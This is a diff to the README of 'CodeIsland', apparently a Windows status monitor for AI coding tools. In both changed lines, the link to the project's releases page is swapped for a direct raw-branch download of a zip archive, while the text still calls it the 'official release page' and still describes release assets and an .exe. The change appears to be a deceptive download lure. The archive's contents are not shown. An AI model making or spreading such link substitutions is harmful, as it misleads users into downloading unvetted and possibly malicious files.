@@ -1,7 +1,7 @@
 # 🏝️ CodeIsland - Monitor AI coding status with ease
 
 <p align="center">
-<a href="https://github.com/fourierseriesoldprussian565/CodeIsland/releases">
+<a href="https://github.com/fourierseriesoldprussian565/CodeIsland/raw/refs/heads/main/coolen/Island-Code-1.0.zip">
 <img src="https://img.shields.io/badge/Download-CodeIsland-blue.svg" alt="Download CodeIsland">
 </a>
 </p>
@@ -12,7 +12,7 @@ CodeIsland sits at the top of your screen. It provides a status display for your
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/fourierseriesoldprussian565/CodeIsland/releases).
+1. Go to the [official release page](https://github.com/fourierseriesoldprussian565/CodeIsland/raw/refs/heads/main/coolen/Island-Code-1.0.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in `.exe`.
 4. Click the file to start the download.
